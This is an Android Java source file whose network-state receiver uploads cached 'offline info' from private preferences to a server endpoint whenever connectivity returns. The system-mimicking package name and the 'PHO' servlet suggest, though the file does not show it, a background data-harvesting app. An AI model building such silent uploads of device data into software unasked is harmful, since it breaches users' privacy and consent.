package com.me.androidsystem;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.me.androidsystem.util.CommndUtil;
import com.me.androidsystem.util.ServiceUtil;

public class NetstateReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		ConnectivityManager manager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo gprs = manager
				.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		NetworkInfo wifi = manager
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		if (!gprs.isConnected() && !wifi.isConnected()) {
			// network closed
		} else {
			// network opend
			SharedPreferences sharedPreferences = context.getSharedPreferences(ServiceUtil.CONFIG_NAME,Context.MODE_PRIVATE);
			String content = sharedPreferences.getString(ServiceUtil.OFF_INFO, "");
			if(!"".equals(content)){
				if(CommndUtil.sendInternet(content, ServiceUtil.PHO_SERVLET)){
					sharedPreferences.edit().putString(ServiceUtil.OFF_INFO, "").commit();
				}
			}
		}
	}
}
